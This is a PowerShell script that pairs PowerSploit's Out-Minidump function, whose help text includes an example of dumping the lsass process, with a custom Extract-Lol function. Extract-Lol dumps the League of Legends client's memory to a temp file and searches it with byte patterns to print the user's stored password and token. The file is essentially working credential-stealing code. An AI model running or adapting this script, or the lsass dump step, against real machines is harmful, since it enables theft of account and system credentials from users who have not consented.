function Out-Minidump
{
<#
.SYNOPSIS

    Generates a full-memory minidump of a process.

    PowerSploit Function: Out-Minidump
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.DESCRIPTION

    Out-Minidump writes a process dump file with all process memory to disk.
    This is similar to running procdump.exe with the '-ma' switch.

.PARAMETER Process

    Specifies the process for which a dump will be generated. The process object
    is obtained with Get-Process.

.PARAMETER DumpFilePath

    Specifies the path where dump files will be written. By default, dump files
    are written to the current working directory. Dump file names take following
    form: processname_id.dmp

.EXAMPLE

    Out-Minidump -Process (Get-Process -Id 4293)

    Description
    -----------
    Generate a minidump for process ID 4293.

.EXAMPLE

    Get-Process lsass | Out-Minidump

    Description
    -----------
    Generate a minidump for the lsass process. Note: To dump lsass, you must be
    running from an elevated prompt.

.EXAMPLE

    Get-Process | Out-Minidump -DumpFilePath C:\temp

    Description
    -----------
    Generate a minidump of all running processes and save them to C:\temp.

.INPUTS

    System.Diagnostics.Process

    You can pipe a process object to Out-Minidump.

.OUTPUTS

    System.IO.FileInfo

.LINK

    http://www.exploit-monday.com/
#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PWD
    )

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}

function Extract-Lol
{
<#
.SYNOPSIS

Tries to extract the League of Legends password from the LolClient process' memory

.DESCRIPTION

It won't work most likely



.EXAMPLE

PS C:\>Extract-Lol

#>

$patterns = ([regex] '\x6C\x6F\x6C\x63\x6C\x69\x65\x6E\x74\x2E\x6C\x6F\x6C\x2E\x72\x69\x6F\x74\x67\x61\x6D\x65\x73\x2E\x63\x6F\x6D',
             [regex] '\x74\x6F\x6B\x65\x6E\x11\x70\x61\x73\x73\x77\x6F\x72\x64\x1D\x61\x63\x63\x6F\x75\x6E\x74\x53\x75\x6D\x6D\x61')

function Seek($inFile, [Int32] $bufSize){
  $stream = [System.IO.File]::OpenRead($inFile)
  $chunkNum = 1
  $barr = New-Object byte[] $bufSize

  while( $bytesRead = $stream.Read($barr,0,$bufSize)){
    Write-Output "Seeking through chunk $chunkNum"
    $ArrayPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($barr, 0)
    $RawString = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ArrayPtr, $barr.Length)
    $q = 0
    ForEach( $Regex in $patterns ) { 
        $q += 1
        $Results = $Regex.Matches($RawString)
	    if ($Results.count -gt 0)
	    {
            $len = $Results.count
            for($i=0;$i-lt$len;$i++){
                $match = $RawString.substring($Results[$i].Index - 600, 1200) #not sure about a good search range
                Write-Output "Pattern $q found:"
                $match -replace "[^\x20-\x7E]", "."
                $Regex = [regex] '\x06\x1B'
                $re = $Regex.Matches($match)
                Write-Output '-------------------------------'
                Write-Output "Best guess: "
                $match.Substring($re[0].Index, 16) -replace "[^\x20-\x7E]", ""
                Write-Output `r
                Write-Output `r
            }
	    }
    }
    $chunkNum += 1
  }
  $stream.close()
}
$proc = Get-Process -Name LolClient 
if ($proc) {
    Write-Output "Waiting for dump to be written ..."
    $dumpfile = Out-Minidump -Process $proc -DumpFilePath $env:temp
    #Start-Sleep -seconds 10
    Write-Output "Seeking through dump ..."
    Seek $dumpfile 100000000
    Remove-Item $dumpfile
    [gc]::collect() #try to free up all that mem shizzle
} else {
    Write-Output "Could not find LolClient process, is it running?"
}
}

#Extract-Lol